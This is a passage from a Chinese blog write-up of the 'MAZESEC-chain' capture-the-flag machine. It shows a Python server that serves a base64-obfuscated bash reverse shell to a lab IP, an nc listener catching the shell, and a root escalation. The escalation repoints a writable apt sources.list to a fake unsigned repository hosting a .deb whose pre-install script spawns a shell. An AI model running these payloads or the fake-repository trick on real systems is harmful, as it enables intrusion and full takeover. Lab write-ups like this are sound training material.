+<pre class="language-python" data-language="python"><code class="language-python">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">/</span>tmp<span class="token punctuation">]</span>
+└─<span class="token comment"># cat server.py </span>
+<span class="token keyword">from</span> http<span class="token punctuation">.</span>server <span class="token keyword">import</span> HTTPServer<span class="token punctuation">,</span> BaseHTTPRequestHandler
+<span class="token keyword">import</span> ssl
+
+<span class="token keyword">class</span> <span class="token class-name">Handler</span><span class="token punctuation">(</span>BaseHTTPRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">do_GET</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> self<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/ll104567/d2VsY29tZTpqdW1v/refs/heads/main/install.sh"</span><span class="token punctuation">:</span>
+            self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>
+            self<span class="token punctuation">.</span>send_header<span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"text/plain"</span><span class="token punctuation">)</span>
+            self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xLzQ1NjcgMD4mMSc= |base64 -d | bash"</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>
+            self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"Not Found"</span><span class="token punctuation">)</span>
+
+<span class="token comment"># 监听端口（可改）</span>
+port <span class="token operator">=</span> <span class="token number">443</span>
+httpd <span class="token operator">=</span> HTTPServer<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">,</span> Handler<span class="token punctuation">)</span>
+
+<span class="token comment"># 生成自签名证书（只需运行一次）</span>
+<span class="token comment"># openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem</span>
+
+<span class="token comment"># 使用 HTTPS（证书文件名需与上面一致）</span>
+httpd<span class="token punctuation">.</span>socket <span class="token operator">=</span> ssl<span class="token punctuation">.</span>wrap_socket<span class="token punctuation">(</span>
+    httpd<span class="token punctuation">.</span>socket<span class="token punctuation">,</span>
+    keyfile<span class="token operator">=</span><span class="token string">"key.pem"</span><span class="token punctuation">,</span>
+    certfile<span class="token operator">=</span><span class="token string">"cert.pem"</span><span class="token punctuation">,</span>
+    server_side<span class="token operator">=</span><span class="token boolean">True</span>
+<span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"HTTPS server running at https://0.0.0.0:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>port<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+httpd<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+
+<p>开个监听</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─<span class="token comment"># nc -lvnp 4567</span>
+listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.</code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span>
+└─<span class="token comment"># python server.py                                                                                                                      </span>
+/tmp/server.py:24: DeprecationWarning: ssl.wrap_socket<span class="token punctuation">(</span><span class="token punctuation">)</span> is deprecated, use SSLContext.wrap_socket<span class="token punctuation">(</span><span class="token punctuation">)</span>
+  httpd.socket <span class="token operator">=</span> ssl.wrap_socket<span class="token punctuation">(</span>
+HTTPS server running at https://0.0.0.0:443
+<span class="token number">192.168</span>.172.128 - - <span class="token punctuation">[</span><span class="token number">10</span>/Oct/2025 00:13:57<span class="token punctuation">]</span> <span class="token string">"GET /ll104567/d2VsY29tZTpqdW1v/refs/heads/main/install.sh HTTP/1.1"</span> <span class="token number">200</span> -</code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─<span class="token comment"># nc -lvnp 4567</span>
+listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
+connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.172.1<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.172.128<span class="token punctuation">]</span> <span class="token number">51790</span>
+bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">1320</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
+bash: no job control <span class="token keyword">in</span> this shell
+fish@Chain:/var/www/html/d2VsY29tZTpqdW1v$ <span class="token function">id</span>
+<span class="token function">id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>fish<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>fish<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>fish<span class="token punctuation">)</span></code></pre>
+
+<p>果然会获取并且执行</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">fish@Chain:~$ <span class="token function">cat</span> user.txt 
+flag<span class="token punctuation">&#123;</span>user-f307bc02d0f7e60e52d128a0c27b8e34<span class="token punctuation">&#125;</span></code></pre>
+
+<h2 id="apt源伪造"><a href="#apt源伪造" class="headerlink" title="apt源伪造"></a>apt源伪造</h2><pre class="language-bash" data-language="bash"><code class="language-bash">fish@Chain:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
+Matching Defaults entries <span class="token keyword">for</span> fish on Chain:
+    env_reset, mail_badpass, <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin
+
+User fish may run the following commands on Chain:
+    <span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> NOPASSWD: /usr/bin/apt update
+    <span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> NOPASSWD: /usr/bin/apt <span class="token function">install</span> dsz
+    <span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> NOPASSWD: /usr/bin/apt remove dsz</code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">fish@Chain:~$ dpkg <span class="token parameter variable">-V</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
+??5?????? c /etc/irssi.conf
+??5?????? c /etc/apache2/apache2.conf
+??5??????   /var/lib/polkit-1/localauthority/10-vendor.d/systemd-networkd.pkla
+??5?????? c /etc/grub.d/10_linux
+??5?????? c /etc/grub.d/40_custom
+??5?????? c /etc/sudoers
+??5?????? c /etc/sudoers.d/README
+??5?????? c /etc/inspircd/inspircd.conf
+??5?????? c /etc/inspircd/inspircd.motd
+??5?????? c /etc/inspircd/inspircd.rules
+??5??????   /var/lib/polkit-1/localauthority/10-vendor.d/org.freedesktop.packagekit.pkla
+??5?????? c /etc/issue</code></pre>
+
+<p>apt没问题</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">fish@Chain:~$ <span class="token function">cat</span> /etc/apt/sources.list
+<span class="token comment"># </span>
+
+<span class="token comment"># deb cdrom:[Debian GNU/Linux 10.13.0 _Buster_ - Official amd64 xfce-CD Binary-1 20220910-18:04]/ bullseye main</span>
+
+<span class="token comment"># deb cdrom:[Debian GNU/Linux 10.13.0 _Buster_ - Official amd64 xfce-CD Binary-1 20220910-18:04]/ bullseye main</span>
+
+<span class="token comment"># deb http://security.debian.org/debian-security bullseye/updates main</span>
+<span class="token comment"># deb-src http://security.debian.org/debian-security bullseye/updates main</span>
+
+<span class="token comment"># bullseye-updates, previously known as 'volatile'</span>
+<span class="token comment"># A network mirror was not selected during install.  The following entries</span>
+<span class="token comment"># are provided as examples, but you should amend them as appropriate</span>
+<span class="token comment"># for your mirror of choice.</span>
+<span class="token comment">#</span>
+deb http://mirrors.aliyun.com/debian/ bullseye-updates main non-free contrib
+deb-src http://mirrors.aliyun.com/debian/ bullseye-updates main non-free contrib
+deb http://mirrors.aliyun.com/debian/ bullseye main non-free contrib
+deb-src http://mirrors.aliyun.com/debian/ bullseye main non-free contrib
+ 
+<span class="token comment"># This system was installed using small removable media</span>
+<span class="token comment"># (e.g. netinst, live or single CD). The matching "deb cdrom"</span>
+<span class="token comment"># entries were disabled at the end of the installation process.</span>
+<span class="token comment"># For information about how to configure apt package sources,</span>
+<span class="token comment"># see the sources.list(5) manual.</span>
+fish@Chain:~$ </code></pre>
+
+<p>用的阿里的镜像源，本来想通过dns欺骗然后伪造一个镜像源但是需要签名认证觉得打不了</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">fish@Chain:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span> /etc/apt/sources.list
+-rw-rw-rw- <span class="token number">1</span> root root <span class="token number">1183</span> Oct  <span class="token number">8</span> 06:53 /etc/apt/sources.list</code></pre>
+
+<p>然后发现这个文件可以写，那就可以不用欺骗也不用签名伪造一个仓库了</p>
+<p>先创建个包，让他在安装前执行命令</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> aaa
+<span class="token builtin class-name">echo</span> <span class="token string">'exec /bin/bash'</span> <span class="token operator">></span> aaa/dsz.sh
+fpm <span class="token parameter variable">-n</span> dsz <span class="token parameter variable">-s</span> <span class="token function">dir</span> <span class="token parameter variable">-t</span> deb <span class="token parameter variable">-a</span> all --before-install aaa/dsz.sh aaa</code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/tmp<span class="token punctuation">]</span>
+└─<span class="token comment"># ls -al dsz_1.0_all.deb </span>
+-rw-r--r-- <span class="token number">1</span> root root <span class="token number">1024</span> Oct <span class="token number">10</span> <span class="token number">22</span>:49 dsz_1.0_all.deb</code></pre>
+
+<p>然后创建一个仓库</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> <span class="token parameter variable">-p</span> ~/fakesource
+<span class="token function">cp</span> /tmp/dsz_1.0_all.deb fakesource/
+<span class="token builtin class-name">cd</span> fakesource
+dpkg-scanpackages <span class="token builtin class-name">.</span> /dev/null <span class="token operator">|</span> <span class="token function">gzip</span> <span class="token parameter variable">-9c</span> <span class="token operator">></span> Packages.gz
+<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>
+python <span class="token parameter variable">-m</span> http.server <span class="token number">80</span></code></pre>
+
+<p>类似这样</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─<span class="token comment"># ls -al fakesource </span>
+total <span class="token number">16</span>
+drwxr-xr-x  <span class="token number">2</span> root root <span class="token number">4096</span> Oct <span class="token number">10</span> <span class="token number">23</span>:05 <span class="token builtin class-name">.</span>
+drwx------ <span class="token number">35</span> root root <span class="token number">4096</span> Oct <span class="token number">10</span> <span class="token number">22</span>:45 <span class="token punctuation">..</span>
+-rw-r--r--  <span class="token number">1</span> root root <span class="token number">1024</span> Oct <span class="token number">10</span> <span class="token number">23</span>:05 dsz_1.0_all.deb
+-rw-r--r--  <span class="token number">1</span> root root  <span class="token number">330</span> Oct <span class="token number">10</span> <span class="token number">23</span>:05 Packages.gz</code></pre>
+
+<p>然后修改靶机的源 <code>[trusted=yes]</code>可以不检查签名</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">deb <span class="token punctuation">[</span>trusted<span class="token operator">=</span>yes<span class="token punctuation">]</span> http://192.168.137.23/fakesource ./
+<span class="token comment">#deb http://mirrors.aliyun.com/debian/ bullseye-updates main non-free contrib</span>
+<span class="token comment">#deb-src http://mirrors.aliyun.com/debian/ bullseye-updates main non-free contrib</span>
+<span class="token comment">#deb http://mirrors.aliyun.com/debian/ bullseye main non-free contrib</span>
+<span class="token comment">#deb-src http://mirrors.aliyun.com/debian/ bullseye main non-free contrib</span></code></pre>
+
+<p>更新</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">fish@Chain:~$ <span class="token function">sudo</span> /usr/bin/apt update
+Ign:1 http://192.168.137.23/fakesource ./ InRelease
+Ign:2 http://192.168.137.23/fakesource ./ Release
+Ign:3 http://192.168.137.23/fakesource ./ Packages
+Ign:4 http://192.168.137.23/fakesource ./ Translation-en_US
+Ign:5 http://192.168.137.23/fakesource ./ Translation-en
+Ign:3 http://192.168.137.23/fakesource ./ Packages
+Ign:4 http://192.168.137.23/fakesource ./ Translation-en_US
+Ign:5 http://192.168.137.23/fakesource ./ Translation-en
+Ign:3 http://192.168.137.23/fakesource ./ Packages
+Ign:4 http://192.168.137.23/fakesource ./ Translation-en_US
+Ign:5 http://192.168.137.23/fakesource ./ Translation-en
+Get:3 http://192.168.137.23/fakesource ./ Packages <span class="token punctuation">[</span><span class="token number">330</span> B<span class="token punctuation">]</span>
+Ign:4 http://192.168.137.23/fakesource ./ Translation-en_US
+Ign:5 http://192.168.137.23/fakesource ./ Translation-en                         
+Ign:4 http://192.168.137.23/fakesource ./ Translation-en_US                      
+Ign:5 http://192.168.137.23/fakesource ./ Translation-en  
+Ign:4 http://192.168.137.23/fakesource ./ Translation-en_US
+Ign:5 http://192.168.137.23/fakesource ./ Translation-en
+Ign:4 http://192.168.137.23/fakesource ./ Translation-en_US
+Ign:5 http://192.168.137.23/fakesource ./ Translation-en
+Hit:6 https://packages.sury.org/php bullseye InRelease
+Fetched <span class="token number">330</span> B <span class="token keyword">in</span> 1s <span class="token punctuation">(</span><span class="token number">570</span> B/s<span class="token punctuation">)</span>       
+Reading package lists<span class="token punctuation">..</span>. Done
+Building dependency tree<span class="token punctuation">..</span>. Done
+Reading state information<span class="token punctuation">..</span>. Done
+<span class="token number">17</span> packages can be upgraded. Run <span class="token string">'apt list --upgradable'</span> to see them</code></pre>
+
+<p>安装dsz</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">fish@Chain:~$ <span class="token function">sudo</span> /usr/bin/apt <span class="token function">install</span> dsz
+Reading package lists<span class="token punctuation">..</span>. Done
+Building dependency tree<span class="token punctuation">..</span>. Done
+Reading state information<span class="token punctuation">..</span>. Done
+The following packages were automatically installed and are no longer required:
+  <span class="token function">aspell</span> aspell-en dictionaries-common emacsen-common fonts-lato libaspell15 libhttp-parser2.9 libmariadb3 libmaxminddb0 libmpdec2 libpq5 libpython3.7-minimal
+  libpython3.7-stdlib libre2-9 libreadline7 libruby2.7 libtre5 mariadb-common mysql-common python3.7-minimal rake ruby ruby-minitest ruby-net-telnet ruby-power-assert
+  ruby-rubygems ruby-test-unit ruby-xmlrpc ruby2.7 rubygems-integration <span class="token function">unzip</span> weechat-core weechat-curses weechat-perl weechat-plugins weechat-python weechat-ruby <span class="token function">zip</span>
+Use <span class="token string">'sudo apt autoremove'</span> to remove them.
+The following NEW packages will be installed:
+  dsz
+<span class="token number">0</span> upgraded, <span class="token number">1</span> newly installed, <span class="token number">0</span> to remove and <span class="token number">17</span> not upgraded.
+Need to get <span class="token number">1,024</span> B of archives.
+After this operation, <span class="token number">0</span> B of additional disk space will be used.
+Get:1 http://192.168.137.23/fakesource ./ dsz <span class="token number">1.0</span> <span class="token punctuation">[</span><span class="token number">1,024</span> B<span class="token punctuation">]</span>
+Fetched <span class="token number">1,024</span> B <span class="token keyword">in</span> 0s <span class="token punctuation">(</span><span class="token number">0</span> B/s<span class="token punctuation">)</span>
+Selecting previously unselected package dsz.
+<span class="token punctuation">(</span>Reading database <span class="token punctuation">..</span>. <span class="token number">53834</span> files and directories currently installed.<span class="token punctuation">)</span>
+Preparing to unpack <span class="token punctuation">..</span>./apt/archives/dsz_1.0_all.deb <span class="token punctuation">..</span>.
+root@Chain:/<span class="token comment"># id</span>
+<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
+
+
+
+</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://ta0.fun/posts/2fc2226d/" title="MAZESEC-chain">http://ta0.fun/posts/2fc2226d/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/75928fc0/" rel="prev" title="MAZESEC-Delete"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">MAZESEC-Delete</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/10540780/" rel="next" title="MAZESEC-Ronos"><span class="post-nav-text">MAZESEC-Ronos</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
+mediumZoom(images)</script><style>.medium-zoom-image {
+  z-index: 99;
+}</style></body></html>
